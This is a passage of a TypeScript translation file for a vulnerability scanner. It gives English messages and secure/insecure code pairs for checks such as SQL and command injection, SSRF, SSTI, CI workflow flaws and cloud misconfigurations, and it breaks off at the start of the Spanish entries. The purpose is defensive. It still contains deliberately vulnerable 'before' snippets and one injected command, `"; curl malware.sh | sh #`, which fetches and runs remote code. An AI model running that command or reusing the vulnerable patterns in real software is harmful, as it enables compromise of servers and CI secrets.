import type { Lang } from "./translations.js";

// Traduzioni dei controlli a pattern. Il motore (src/checks/) resta l'unica
// fonte di verità per id, gravità e logica di rilevamento — qui traduciamo
// solo il testo pensato per chi legge, tenuto in un file separato così il
// motore condiviso (CLI, MCP, server) resta invariato e in italiano.
export interface CheckTranslation {
  title: string;
  description: string;
  fix: { before: string; after: string };
}

/**
 * I controlli a pattern (src/checks/) hanno un titolo e una descrizione
 * fissi per ogni checkId, qui traducibili con una semplice voce statica. I
 * controlli di Fase 2 (dipendenze, e in arrivo IaC/cloud config) generano
 * invece testo diverso ad ogni finding (nome pacchetto, versione, ID della
 * vulnerabilità...) — per questi la voce è una funzione che riceve il testo
 * italiano originale e ne deriva la versione nella lingua di destinazione,
 * invece di un oggetto fisso.
 */
type CheckTranslationEntry = CheckTranslation | ((original: CheckTranslation) => CheckTranslation);

type TranslatedCheckLang = Exclude<Lang, "it">;

/**
 * L'italiano è la lingua "nativa" del motore (src/checks/), quindi in
 * italiano restituiamo sempre il testo originale del Check/Finding così
 * com'è. Per ogni altra lingua: usiamo la sua tabella se esiste una voce per
 * quel checkId, altrimenti l'inglese come ripiego (più comprensibile a
 * livello globale dell'italiano), altrimenti l'italiano originale — così una
 * lingua ancora incompleta non mostra mai un testo mancante, solo l'inglese
 * finché non viene tradotta anche lei.
 */
export function translateCheckText<T extends { title: string; description: string; fix: { before: string; after: string } }>(
  checkId: string,
  original: T,
  lang: string
): { title: string; description: string; fix: { before: string; after: string } } {
  if (lang === "it") return original;
  const entry =
    checkTranslations[lang as TranslatedCheckLang]?.[checkId] ?? checkTranslations.en?.[checkId];
  if (!entry) return original;
  return typeof entry === "function" ? entry(original) : entry;
}

// Fase 2 — dependency scanning. Nome pacchetto, versione e ID della
// vulnerabilità (es. GHSA-...) sono lasciati invariati in ogni lingua: sono
// identificatori tecnici, non testo da tradurre. Lo stesso vale per il
// riassunto preso da OSV.dev nella description: i database di vulnerabilità
// pubblici (CVE, GHSA) sono nativamente in inglese anche quando il sito è in
// un'altra lingua — tradurlo rischierebbe di perdere precisione tecnica, per
// questo resta identico in tutte le lingue tranne il titolo e la nota finale.
const vulnerableDependencyEn: CheckTranslationEntry = (original) => ({
  title: original.title.replace("Dipendenza vulnerabile:", "Vulnerable dependency:"),
  description: original.description,
  fix: {
    before: original.fix.before,
    after: original.fix.after.replace(
      "Nessuna versione corretta nota ancora — valuta un pacchetto alternativo o segui gli aggiornamenti del progetto.",
      "No fixed version known yet — consider an alternative package or follow the project's updates."
    ),
  },
});

export const checkTranslations: Partial<Record<TranslatedCheckLang, Record<string, CheckTranslationEntry>>> = {
  en: {
    "supabase-service-role-in-client": {
      title: "Supabase's secret key ends up in a browser-facing file",
      description:
        "A variable with a public prefix (e.g. NEXT_PUBLIC_, VITE_) or a client-side file references Supabase's service role key. This key bypasses Row Level Security: if it ends up in the browser bundle, anyone can read it and act as a database administrator.",
      fix: {
        before: `// components/Dashboard.tsx\nconst supabase = createClient(url, process.env.NEXT_PUBLIC_SUPABASE_SERVICE_ROLE_KEY)`,
        after: `// app/api/admin/route.ts (server only)\nconst supabase = createClient(url, process.env.SUPABASE_SERVICE_ROLE_KEY)`,
      },
    },
    "hardcoded-secret": {
      title: "Passwords or secret keys are written directly in the code",
      description:
        "An API key, token, or password appears to be written as a literal value instead of read from an environment variable. Anyone who reads the source code (or the repository, if public) gets that secret.",
      fix: {
        before: `const apiKey = "sk_live_51H8x9K2eZvKYlo2C..."`,
        after: `const apiKey = process.env.STRIPE_SECRET_KEY`,
      },
    },
    "env-file-with-real-values": {
      title: "A file with the project's real passwords is among those analyzed",
      description:
        "A .env file with real values (not a .env.example) is included in the analysis. If this file ends up in a repository or a public deploy, every credential it contains is exposed.",
      fix: {
        before: `# .env (committed by mistake)\nDATABASE_URL=postgres://user:realpassword@db.host/prod`,
        after: `# .env.example (committed)\nDATABASE_URL=postgres://user:password@localhost/dev\n\n# .env stays out of the repo (.gitignore)`,
      },
    },
    "missing-row-level-security": {
      title: "Anyone can read or modify every user's data",
      description:
        "Row Level Security is disabled, or a policy allows access to anyone (USING (true)) without checking who's making the request. Every authenticated user — or even an anonymous one — can read or modify everyone else's data.",
      fix: {
        before: `ALTER TABLE public.orders DISABLE ROW LEVEL SECURITY;`,
        after: `ALTER TABLE public.orders ENABLE ROW LEVEL SECURITY;\nCREATE POLICY "owners only" ON public.orders\n  USING (auth.uid() = user_id);`,
      },
    },
    "sql-injection": {
      title: "A value entered by the user is pasted directly into a database query",
      description:
        "A SQL query is built by concatenating or interpolating a string directly instead of using parameters. If that text comes (even indirectly) from a user, it can alter the query itself — SQL injection.",
      fix: {
        before: "db.query(`SELECT * FROM users WHERE email = '${email}'`)",
        after: `db.query("SELECT * FROM users WHERE email = $1", [email])`,
      },
    },
    "plaintext-password-storage": {
      title: "Passwords don't seem to be protected",
      description:
        "A password field is saved exactly as it arrived in the request, and no hashing function (bcrypt, argon2, scrypt) appears in the file. If the database is compromised, every password is immediately usable.",
      fix: {
        before: `await db.users.insert({ email, password: req.body.password })`,
        after: `const hashed = await bcrypt.hash(req.body.password, 12)\nawait db.users.insert({ email, password: hashed })`,
      },
    },
    "hardcoded-jwt-secret": {
      title: "The secret used to sign logins is written in plain text in the code",
      description:
        "The secret passed to jwt.sign / jwt.verify (or the JWT_SECRET variable) is a literal value in the code instead of coming from an environment variable. Anyone who reads it can create valid access tokens for any user.",
      fix: {
        before: `jwt.sign(payload, "super-secret-key-123")`,
        after: `jwt.sign(payload, process.env.JWT_SECRET)`,
      },
    },
    "command-injection": {
      title: "The server can be forced to run external commands",
      description:
        "A function that runs system commands (exec, execSync, spawn) receives a string built by interpolation or concatenation. If part of that string comes from user input, whoever controls it can run arbitrary commands on the server.",
      fix: {
        before: "execSync(`convert ${filename} output.png`)",
        after: `execFile("convert", [filename, "output.png"])`,
      },
    },
    "unprotected-new-table": {
      title: "A new table appears to be created without protection",
      description:
        "A SQL migration creates a table but doesn't enable Row Level Security for that same table in the same file. As long as it stays this way, the table starts out with no restriction on who can read or write it.",
      fix: {
        before: `CREATE TABLE public.invoices (\n  id uuid PRIMARY KEY,\n  user_id uuid REFERENCES auth.users\n);`,
        after: `CREATE TABLE public.invoices (\n  id uuid PRIMARY KEY,\n  user_id uuid REFERENCES auth.users\n);\nALTER TABLE public.invoices ENABLE ROW LEVEL SECURITY;`,
      },
    },
    "permissive-cors": {
      title: "The site accepts requests from any other website",
      description:
        "The CORS header is set to accept requests from any origin (*), or the cors() middleware is used without restrictions. Any third-party website can call your APIs from the browser of an already-authenticated user.",
      fix: {
        before: `app.use(cors())`,
        after: `app.use(cors({ origin: ["https://yoursite.com"] }))`,
      },
    },
    "admin-function-missing-auth": {
      title: "A function with admin permissions doesn't check who's using it",
      description:
        "A route or function whose name suggests admin operations doesn't contain, in the nearby lines, any authentication or role check. Anyone who knows the URL could run it.",
      fix: {
        before: `router.post("/admin/delete-user", async (req, res) => {\n  await db.users.delete(req.body.id)\n})`,
        after: `router.post("/admin/delete-user", requireAuth, requireRole("admin"), async (req, res) => {\n  await db.users.delete(req.body.id)\n})`,
      },
    },
    ssrf: {
      title: "The site can be forced to run external code",
      description:
        "An outgoing HTTP request (fetch, axios) directly uses a value coming from a user's request as the destination URL. A malicious user can make your server call internal or arbitrary addresses — Server-Side Request Forgery.",
      fix: {
        before: `const data = await fetch(req.query.url)`,
        after: `const ALLOWED = new Set(["https://api.yourservice.com"])\nif (!ALLOWED.has(req.query.url)) throw new Error("URL not allowed")\nconst data = await fetch(req.query.url)`,
      },
    },
    "weak-password-hashing": {
      title: "Passwords are protected with a method that's now easy to break",
      description:
        "On the same line, md5() or sha1() are applied to a value tied to a password. These algorithms are too fast to compute: an attacker with the database can try billions of passwords per second.",
      fix: {
        before: `const hashed = crypto.createHash("md5").update(password).digest("hex")`,
        after: `const hashed = await bcrypt.hash(password, 12)`,
      },
    },
    "xss-dangerous-html": {
      title: "Text written by users could run code in the browser",
      description:
        "Content is inserted into the page as raw HTML (dangerouslySetInnerHTML, v-html, .innerHTML) instead of as plain text. If that content includes user input, it can contain scripts that run in the browser of whoever reads the page.",
      fix: {
        before: `<div dangerouslySetInnerHTML={{ __html: comment.text }} />`,
        after: `<div>{comment.text}</div>\n// or, if HTML is needed: DOMPurify.sanitize(comment.text)`,
      },
    },
    "public-storage-bucket": {
      title: "The space for uploaded files is visible to anyone",
      description:
        "A storage bucket (Supabase Storage, S3) is configured as public. If it contains documents, photos, or files uploaded by users, anyone who knows — or guesses — the path can access them without authentication.",
      fix: {
        before: `supabase.storage.createBucket("uploads", { public: true })`,
        after: `supabase.storage.createBucket("uploads", { public: false })\n// serve files with time-limited signed URLs: createSignedUrl(path, 60)`,
      },
    },
    "csrf-state-changing-get": {
      title: "A single link is enough to delete or change data",
      description:
        "A GET route performs an operation that changes data (the path contains delete/remove/update/edit). GET requests run just by visiting a link or loading an image from an external site — the classic stepping stone for a CSRF attack.",
      fix: {
        before: `router.get("/posts/:id/delete", deletePost)`,
        after: `router.post("/posts/:id/delete", requireAuth, csrfProtection, deletePost)`,
      },
    },
    "insecure-token-storage": {
      title: "Login data saved in the browser isn't well protected",
      description:
        "An access token is saved in localStorage. Unlike an httpOnly cookie, any script running on the page (including a malicious one injected via XSS) can read and steal it.",
      fix: {
        before: `localStorage.setItem("authToken", token)`,
        after: `// set the token as an httpOnly cookie from the server:\nres.cookie("authToken", token, { httpOnly: true, secure: true, sameSite: "strict" })`,
      },
    },
    "open-redirect": {
      title: "The site can be used to redirect to a scam website",
      description:
        "The site redirects the user to an address taken directly from the request (query, body, params) without checking that it's a known domain. A link that looks like it points to your site can actually lead to a phishing page.",
      fix: {
        before: `res.redirect(req.query.next)`,
        after: `const ALLOWED = new Set(["/dashboard", "/profile"])\nres.redirect(ALLOWED.has(req.query.next) ? req.query.next : "/dashboard")`,
      },
    },
    idor: {
      title: "Changing a number in the address could show someone else's data",
      description:
        "A database query directly uses an identifier taken from the URL (req.params.id) without checking, in the nearby lines, that it belongs to the user making the request. Changing the id in the address could give access to another user's data — Insecure Direct Object Reference.",
      fix: {
        before: `const order = await Order.findById(req.params.id)`,
        after: `const order = await Order.findOne({ _id: req.params.id, userId: req.user.id })`,
      },
    },
    "no-login-rate-limit": {
      title: "The login form doesn't block too many attempts in a row",
      description:
        "A login route is defined in the file, but there's no trace of rate-limiting middleware in the same file. Without a limit on attempts, an attacker can try passwords in sequence (brute force) without being slowed down.",
      fix: {
        before: `router.post("/login", loginHandler)`,
        after: `import rateLimit from "express-rate-limit"\nconst loginLimiter = rateLimit({ windowMs: 15 * 60 * 1000, max: 5 })\nrouter.post("/login", loginLimiter, loginHandler)`,
      },
    },
    "sensitive-data-in-logs": {
      title: "Passwords or sensitive data end up in logs",
      description:
        "A call to console.log (or similar) includes a variable called password, token, secret, or apiKey. If these logs end up in an external service or a file, sensitive data stays exposed for much longer than necessary.",
      fix: {
        before: `console.log("login attempt", { email, password })`,
        after: `console.log("login attempt", { email })`,
      },
    },
    "path-traversal": {
      title: "A file on the server can be read or written by choosing the path from outside",
      description:
        "A function that reads, writes, or sends a file gets the path directly from a request value (query, body, params) without checking that it stays inside an allowed folder. An attacker can insert \"../\" to escape the intended folder and read or overwrite arbitrary files on the server (e.g. a configuration file with credentials).",
      fix: {
        before: `app.get("/download", (req, res) => {\n  res.sendFile(req.query.file)\n})`,
        after: `const ALLOWED_DIR = path.resolve("./uploads")\napp.get("/download", (req, res) => {\n  const target = path.resolve(ALLOWED_DIR, req.query.file)\n  if (!target.startsWith(ALLOWED_DIR)) return res.status(400).send("Path not allowed")\n  res.sendFile(target)\n})`,
      },
    },
    "nosql-injection": {
      title: "A value entered by the user is executed as code inside a MongoDB query",
      description:
        "MongoDB's $where operator runs server-side JavaScript for every document — if that string is built by concatenating a value that comes from the user, whoever controls it can make arbitrary code run in the database's context, not just alter the filter like with a normal SQL injection.",
      fix: {
        before: `db.collection.find({ $where: "this.username == '" + username + "'" })`,
        after: `db.collection.find({ username: username })`,
      },
    },
    ssti: {
      title: "A value entered by the user is interpreted as a template, not as data",
      description:
        "A function that compiles/renders a template receives the ENTIRE template from a request value, instead of using a fixed template and passing only the data. An attacker can write directly in the template engine's syntax (e.g. {{7*7}} for Jinja2) and run code on the server — Server-Side Template Injection, which often leads to arbitrary command execution, not just a display issue like XSS.",
      fix: {
        before: `return render_template_string(request.args.get("name"))`,
        after: `return render_template("profile.html", name=request.args.get("name"))`,
      },
    },
    xxe: {
      title: "The XML parser can be forced to read files or make external requests",
      description:
        "An XML parser (DocumentBuilderFactory) is created without explicitly disabling external entities (DOCTYPE) in the nearby lines. If the parser receives XML from an untrusted source, an attacker can define an external entity to read files on the server or make it contact an address of their choice — XML External Entity.",
      fix: {
        before: `DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();\nDocumentBuilder builder = factory.newDocumentBuilder();`,
        after: `DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();\nfactory.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);\nDocumentBuilder builder = factory.newDocumentBuilder();`,
      },
    },
    "terraform-open-security-group": {
      title: "A Terraform security group opens a sensitive port to the whole internet",
      description:
        "A rule with \"cidr_blocks\" that includes 0.0.0.0/0 (any IP address) is near a sensitive port — SSH (22), RDP (3389), or a typical database port (MySQL, Postgres, MongoDB, Redis, SQL Server). Anyone on the internet can try to connect to that service, not just who should.",
      fix: {
        before: `ingress {\n  from_port   = 22\n  to_port     = 22\n  protocol    = "tcp"\n  cidr_blocks = ["0.0.0.0/0"]\n}`,
        after: `ingress {\n  from_port   = 22\n  to_port     = 22\n  protocol    = "tcp"\n  cidr_blocks = ["10.0.0.0/16"]  # only your private network, or a bastion host\n}`,
      },
    },
    "gcp-firewall-open-to-internet": {
      title: "A Google Cloud firewall rule opens a sensitive port to the whole internet",
      description:
        "A \"google_compute_firewall\" resource with \"source_ranges\" that includes 0.0.0.0/0 (any IP address) allows traffic to a sensitive port — SSH (22), RDP (3389), or a typical database port (MySQL, Postgres, MongoDB, Redis, SQL Server). Anyone on the internet can try to connect to that service, not just who should.",
      fix: {
        before: `resource "google_compute_firewall" "allow-ssh" {\n  allow {\n    protocol = "tcp"\n    ports    = ["22"]\n  }\n  source_ranges = ["0.0.0.0/0"]\n}`,
        after: `resource "google_compute_firewall" "allow-ssh" {\n  allow {\n    protocol = "tcp"\n    ports    = ["22"]\n  }\n  source_ranges = ["10.0.0.0/16"]  # only your private network, or a bastion host\n}`,
      },
    },
    "azure-nsg-open-to-internet": {
      title: "An Azure network rule opens a sensitive port to the whole internet",
      description:
        "A network security rule (\"azurerm_network_security_rule\", or a \"security_rule\" block inside \"azurerm_network_security_group\") with \"source_address_prefix\" set to \"*\" or \"0.0.0.0/0\", direction \"Inbound\" and access \"Allow\", near a sensitive port — SSH (22), RDP (3389), or a typical database port. Anyone on the internet can try to connect to that service, not just who should.",
      fix: {
        before: `resource "azurerm_network_security_rule" "allow-ssh" {\n  direction              = "Inbound"\n  access                 = "Allow"\n  destination_port_range = "22"\n  source_address_prefix  = "*"\n}`,
        after: `resource "azurerm_network_security_rule" "allow-ssh" {\n  direction              = "Inbound"\n  access                 = "Allow"\n  destination_port_range = "22"\n  source_address_prefix  = "10.0.0.0/16"  # only your private network, or a bastion host\n}`,
      },
    },
    "terraform-hardcoded-secret": {
      title: "A secret is written as the default value of a Terraform variable",
      description:
        "A variable with a name like password/secret/token/key has a literal value in its \"default\". Unlike a value passed at runtime (tfvars, TF_VAR_* environment variables), a default ends up in the source code — and if the repository is shared or public, anyone can see it, even without access to the Terraform state.",
      fix: {
        before: `variable "db_password" {\n  default = "supersecret123"\n}`,
        after: `variable "db_password" {\n  # no default: pass it with a .tfvars file (outside git) or a TF_VAR_db_password environment variable\n  sensitive = true\n}`,
      },
    },
    "gha-script-injection": {
      title: "A value controlled by an external user goes directly into a CI shell command",
      description:
        'A "run:" command in a GitHub Actions workflow directly interpolates a value like a pull request title, a branch name, or a comment\'s text — all writable by anyone who opens a pull request or comment, even from an external fork. A value like `"; curl malware.sh | sh #` would run arbitrary commands in the CI, with access to every secret available in that workflow.',
      fix: {
        before: `- run: echo "\${{ github.event.pull_request.title }}"`,
        after: `- env:\n    PR_TITLE: \${{ github.event.pull_request.title }}\n  run: echo "$PR_TITLE"  # passed as an environment variable, never interpolated directly into the command`,
      },
    },
    "gha-pull-request-target-checkout": {
      title: "The workflow runs an external pull request's code with access to the repository's secrets",
      description:
        'The workflow uses "pull_request_target" — which runs with the base repository\'s permissions and secrets even for a pull request opened from an unrelated fork — and checks out the pull request\'s own code ("github.event.pull_request.head"), not the base branch. Whoever opens the pull request effectively gets their own code to run with access to those secrets.',
      fix: {
        before: `on:\n  pull_request_target:\njobs:\n  build:\n    steps:\n      - uses: actions/checkout@v4\n        with:\n          ref: \${{ github.event.pull_request.head.sha }}`,
        after: `on:\n  pull_request_target:\njobs:\n  build:\n    steps:\n      # Checks out the base branch, not the PR's code — or use\n      # "pull_request" instead of "pull_request_target" if you don't need\n      # the broader permissions/secrets.\n      - uses: actions/checkout@v4`,
      },
    },
    "insecure-deserialization": {
      title: "Request data is deserialized with a format that can execute code",
      description:
        "pickle (Python), unserialize() (PHP), ObjectInputStream (Java), or the node-serialize library (Node) are deserializing a value taken directly from the request. Unlike JSON, these formats can represent and execute code during deserialization itself — whoever controls the value sent can achieve arbitrary code execution on the server.",
      fix: {
        before: `data = pickle.loads(request.data)`,
        after: `import json\ndata = json.loads(request.data)  # JSON never executes code while parsing, unlike pickle`,
      },
    },
    "jwt-none-algorithm": {
      title: 'The code explicitly accepts unsigned JWT tokens ("none" algorithm)',
      description:
        '"none" appears among the algorithms accepted to verify a JWT token. A token with the "none" algorithm has no signature to verify: anyone can build one with any content (e.g. an admin role) and the code would accept it as valid.',
      fix: {
        before: `jwt.verify(token, secret, { algorithms: ["HS256", "none"] })`,
        after: `jwt.verify(token, secret, { algorithms: ["HS256"] })  // never include "none" among the accepted algorithms`,
      },
    },
    "terraform-s3-block-public-access-disabled": {
      title: "Block Public Access is disabled on an S3 bucket defined in Terraform",
      description:
        'One or more of the four protections in "aws_s3_bucket_public_access_block" (block_public_acls, ignore_public_acls, block_public_policy, restrict_public_buckets) are set to false. It doesn\'t mean the bucket is already public, but it removes a safety net that would prevent it from being made public by mistake in the future.',
      fix: {
        before: `resource "aws_s3_bucket_public_access_block" "example" {\n  block_public_acls = false\n}`,
        after: `resource "aws_s3_bucket_public_access_block" "example" {\n  block_public_acls       = true\n  ignore_public_acls      = true\n  block_public_policy     = true\n  restrict_public_buckets = true\n}`,
      },
    },
    "terraform-iam-wildcard-policy": {
      title: "An IAM policy defined in Terraform grants full access",
      description:
        'A statement with action "*" and resource "*" grants full access to every AWS service and resource — the same check already done on the live IAM state, here read directly from the code before it\'s even applied. It might be intended for an emergency role, but it should be confirmed: for everyday use, grant only the permissions that are actually needed.',
      fix: {
        before: `statement {\n  effect    = "Allow"\n  actions   = ["*"]\n  resources = ["*"]\n}`,
        after: `statement {\n  effect    = "Allow"\n  actions   = ["s3:GetObject"]\n  resources = ["arn:aws:s3:::your-bucket/*"]\n}`,
      },
    },
    "gcp-storage-bucket-public": {
      title: "A Google Cloud Storage bucket is made readable by anyone",
      description:
        'A "google_storage_bucket_iam_member" or "google_storage_bucket_iam_binding" resource grants a role to "allUsers" or "allAuthenticatedUsers" — the first makes the bucket readable by anyone on the internet, even without a Google account; the second by anyone with any Google account, not just who should have access.',
      fix: {
        before: `resource "google_storage_bucket_iam_member" "public" {\n  bucket = google_storage_bucket.example.name\n  role   = "roles/storage.objectViewer"\n  member = "allUsers"\n}`,
        after: `resource "google_storage_bucket_iam_member" "example" {\n  bucket = google_storage_bucket.example.name\n  role   = "roles/storage.objectViewer"\n  member = "user:someone@example.com"  # only whoever should actually have access, not allUsers/allAuthenticatedUsers\n}`,
      },
    },
    "azure-storage-public-access": {
      title: "Public blob access is enabled on an Azure storage account",
      description:
        '"allow_blob_public_access" is set to true on an "azurerm_storage_account": anyone who knows the URL of a blob/container made public can read it, without any authentication.',
      fix: {
        before: `resource "azurerm_storage_account" "example" {\n  allow_blob_public_access = true\n}`,
        after: `resource "azurerm_storage_account" "example" {\n  allow_blob_public_access = false\n}`,
      },
    },
    "gcp-iam-overly-broad-role": {
      title: "A Google Cloud IAM role grants full access (Owner/Editor)",
      description:
        'A "google_project_iam_binding"/"google_project_iam_member" (or the equivalent at organization/folder level) assigns the primitive role "roles/owner" or "roles/editor" — near-complete access to every service in the project. It might be intended for an emergency account, but it should be confirmed: for everyday use, grant only the more specific predefined roles that are actually needed.',
      fix: {
        before: `resource "google_project_iam_member" "admin" {\n  project = "my-project"\n  role    = "roles/owner"\n  member  = "user:dev@example.com"\n}`,
        after: `resource "google_project_iam_member" "admin" {\n  project = "my-project"\n  role    = "roles/storage.admin"  # only the predefined role that's actually needed, not roles/owner\n  member  = "user:dev@example.com"\n}`,
      },
    },
    "azure-role-assignment-owner": {
      title: "An Azure role assignment grants full access (Owner)",
      description:
        'An "azurerm_role_assignment" assigns the "Owner" role — full access, including control over other users\' permissions, over the entire assigned scope (subscription, resource group...). It might be intended for an emergency account, but it should be confirmed: for everyday use, grant only the more specific role that\'s actually needed (e.g. "Contributor" on a single resource group).',
      fix: {
        before: `resource "azurerm_role_assignment" "example" {\n  scope                = data.azurerm_subscription.primary.id\n  role_definition_name = "Owner"\n}`,
        after: `resource "azurerm_role_assignment" "example" {\n  scope                = azurerm_resource_group.example.id\n  role_definition_name = "Contributor"  # only the more specific role that's actually needed, not Owner on the whole subscription\n}`,
      },
    },
    "weak-random-token": {
      title: "A security token is generated with a random number generator that isn't cryptographically secure",
      description:
        "A value with a name like token/session/reset/otp/csrf is generated with Math.random() (JS), random.random() (Python), or rand() (PHP) — generators not designed for security, whose sequences are predictable. A token generated this way can be guessed or reconstructed, defeating the purpose it exists for (e.g. a password reset link that anyone could predict).",
      fix: {
        before: `const resetToken = Math.random().toString(36).slice(2);`,
        after: `const resetToken = crypto.randomBytes(32).toString("hex"); // crypto, not Math.random — unpredictable`,
      },
    },
    "ldap-injection": {
      title: "An LDAP filter is built by directly concatenating a request value",
      description:
        'A line that builds an LDAP filter (e.g. "(uid=...)") directly includes a value taken from the request, without any escaping of LDAP special characters. Whoever controls that value can alter the filter\'s logic — for example bypassing an authentication check or reading directory data they shouldn\'t see.',
      fix: {
        before: `const filter = \`(uid=\${req.body.username})\`;\nclient.search(base, { filter });`,
        after: `const filter = \`(uid=\${ldapEscape(req.body.username)})\`; // LDAP special characters must always be escaped before using them in a filter\nclient.search(base, { filter });`,
      },
    },
    "header-injection": {
      title: "A request value ends up directly in an HTTP response header",
      description:
        "An HTTP response header is set with a value taken directly from the request (query, body, params), without checking that it doesn't contain a line break (CRLF). An attacker can insert additional headers or even an entirely different response — response splitting — potentially manipulating caching, cookies, or the content shown to other users.",
      fix: {
        before: `res.setHeader("X-Redirect-Reason", req.query.reason)`,
        after: `const ALLOWED_REASONS = new Set(["expired", "manual"])\nres.setHeader("X-Redirect-Reason", ALLOWED_REASONS.has(req.query.reason) ? req.query.reason : "unknown")`,
      },
    },
    "gha-unpinned-action": {
      title: "A third-party CI action isn't pinned to a precise version (commit SHA)",
      description:
        'The workflow uses a third-party action referenced by tag or branch (e.g. "@v1", "@main") instead of by commit SHA. Whoever maintains it — or whoever compromises their account — can move that reference to a different commit at any time, silently changing what runs in the CI, with access to its secrets. A commit SHA always points to the exact same code.',
      fix: {
        before: `uses: some-org/some-action@v1`,
        after: `uses: some-org/some-action@a1b2c3d4e5f6...  # v1, pinned to the commit SHA — update the SHA when you update the version`,
      },
    },
    "gha-excessive-permissions": {
      title: "The workflow grants itself every token permission instead of only the ones it uses",
      description:
        '"permissions: write-all" grants the workflow\'s GITHUB_TOKEN write access to everything — issues, pull requests, packages, deployments — even if the workflow only uses some of it. If a step in the workflow is compromised (a malicious dependency, an injected script), those broader permissions increase what whoever exploits it can do.',
      fix: {
        before: `permissions: write-all`,
        after: `permissions:\n  contents: read\n  pull-requests: write  # only the permissions the workflow actually uses`,
      },
    },
    "insecure-cookie-flags": {
      title: "A session or authentication cookie is set without the Secure and HttpOnly flags",
      description:
        'A cookie with a name resembling session/auth/token is set without "httpOnly" and "secure" among its options. Without httpOnly, JavaScript on the page — including code injected via XSS — can read that cookie. Without secure, it can also be sent over an unencrypted HTTP connection.',
      fix: {
        before: `res.cookie("session", sessionId)`,
        after: `res.cookie("session", sessionId, { httpOnly: true, secure: true, sameSite: "strict" })`,
      },
    },
    "vulnerable-dependency": vulnerableDependencyEn,
    "docker-hardcoded-secret": {
      title: "A secret is written directly in an ENV or ARG instruction in the Dockerfile",
      description:
        "A variable with a name like password/secret/token/key has a literal value in an ENV or ARG instruction. Unlike a .env file (which normally doesn't end up in the image), this value gets baked into the Docker image itself — anyone who can pull it or inspect the layer history can recover it, even if the line is removed in a later version of the Dockerfile.",
      fix: {
        before: `ENV DB_PASSWORD=supersecret123`,
        after: `ARG DB_PASSWORD\nENV DB_PASSWORD=$DB_PASSWORD\n# passed with: docker build --build-arg DB_PASSWORD=*** (or, better yet,\n# a BuildKit secret mount, which never ends up in the layer history)`,
      },
    },
    "docker-missing-user": {
      title: "The Dockerfile doesn't set a non-root user",
      description:
        "No USER instruction in the Dockerfile: without one, the container runs as root. If an attacker manages to run code inside the container (e.g. by exploiting a vulnerable library), being root inside the container makes an escape to the host — or a wider impact on the surrounding system — easier.",
      fix: {
        before: `FROM node:20-slim\nWORKDIR /app\nCOPY . .\nCMD ["node", "server.js"]`,
        after: `FROM node:20-slim\nWORKDIR /app\nCOPY . .\nUSER node\nCMD ["node", "server.js"]`,
      },
    },
    "docker-unpinned-base-image": {
      title: 'The Dockerfile\'s base image uses the ":latest" tag',
      description:
        'A FROM instruction explicitly uses the ":latest" tag instead of a precise version. "latest" changes over time: the same build, redone at a different moment, can get a different version of the base image — a non-reproducible build, and an unwanted update can arrive without anyone having decided it should.',
      fix: {
        before: `FROM node:latest`,
        after: `FROM node:20.11-slim`,
      },
    },
    "docker-add-remote-url": {
      title: "The Dockerfile downloads a remote file with ADD instead of COPY",
      description:
        "An ADD instruction with an http/https URL downloads a file from the internet during the build, with no integrity check and with the content invisible in the repository. If that URL is ever compromised, the build pulls in arbitrary content without anyone noticing just by reading the Dockerfile.",
      fix: {
        before: `ADD https://example.com/install.sh /tmp/install.sh`,
        after: `RUN curl -fsSL https://example.com/install.sh -o /tmp/install.sh \\\n    && echo "<expected hash>  /tmp/install.sh" | sha256sum -c -`,
      },
    },
    "k8s-privileged-container": {
      title: "A container in the Kubernetes manifest runs as privileged",
      description:
        '"privileged: true" in a container\'s securityContext disables almost all the usual isolation between container and host: the container can access the host\'s devices, change its network configuration, and in many cases effectively gain root access to the machine running it. Almost never needed for a normal app.',
      fix: {
        before: `securityContext:\n  privileged: true`,
        after: `securityContext:\n  privileged: false\n  capabilities:\n    add: ["NET_BIND_SERVICE"]  # only the capabilities actually needed`,
      },
    },
    "k8s-plaintext-secret-env": {
      title: "A secret is written in plain text in a Kubernetes manifest's env variable",
      description:
        'An environment variable with a name like password/secret/token/key has a literal value ("value:") instead of being read from a Secret ("valueFrom.secretKeyRef"). The manifest itself — often committed to a repository — therefore contains the secret in plain text, visible even to someone who can only read the configuration, not necessarily run commands in the cluster.',
      fix: {
        before: `env:\n  - name: DB_PASSWORD\n    value: supersecret123`,
        after: `env:\n  - name: DB_PASSWORD\n    valueFrom:\n      secretKeyRef:\n        name: db-credentials\n        key: password`,
      },
    },
    "k8s-run-as-root": {
      title: "A container in the Kubernetes manifest is set to run as root",
      description:
        '"runAsUser: 0" or "runAsNonRoot: false" in the securityContext explicitly force the container to run as root. If an attacker manages to run code inside the container (e.g. by exploiting a vulnerable library), being root inside the container makes an escape to the host — or a wider impact — easier.',
      fix: {
        before: `securityContext:\n  runAsUser: 0`,
        after: `securityContext:\n  runAsNonRoot: true\n  runAsUser: 1000`,
      },
    },
    "k8s-privilege-escalation": {
      title: "A container in the Kubernetes manifest can gain more privileges than it started with",
      description:
        '"allowPrivilegeEscalation: true" in the securityContext lets a process inside the container gain more privileges than the process that started it (e.g. through a setuid binary). Combined with a vulnerability in the application, it\'s one more step toward running code with more privileges than intended.',
      fix: {
        before: `securityContext:\n  allowPrivilegeEscalation: true`,
        after: `securityContext:\n  allowPrivilegeEscalation: false`,
      },
    },
    "k8s-host-namespace-access": {
      title: "A pod in the Kubernetes manifest shares the host's network, processes, or shared memory",
      description:
        '"hostNetwork", "hostPID" or "hostIPC" set to true take the pod out of its normal isolation: hostNetwork exposes the pod on the host\'s network (bypassing the cluster\'s network policies), hostPID gives it visibility into every process on the host machine, hostIPC gives it access to the host\'s shared memory. Almost never needed for a normal app — typically only for low-level system/monitoring tools.',
      fix: {
        before: `spec:\n  hostNetwork: true`,
        after: `spec:\n  hostNetwork: false`,
      },
    },
    "k8s-missing-run-as-non-root": {
      title: "The Kubernetes manifest doesn't explicitly enforce running as a non-root user",
      description:
        'No "runAsNonRoot" anywhere in the manifest (neither at pod nor at container level): without setting it, a container runs as whatever user its image defines — often root by default, if the image itself hasn\'t changed that. Setting it explicitly to true makes the pod fail to start if the image still tries to run as root, instead of only finding out after an incident.',
      fix: {
        before: `containers:\n  - name: app\n    image: myapp:1.0`,
        after: `containers:\n  - name: app\n    image: myapp:1.0\n    securityContext:\n      runAsNonRoot: true`,
      },
    },
  },
  es: {
  "supabase-service-role-in-client": {
    title: "La clave secreta de Supabase termina en una parte pensada para el navegador",
    description:
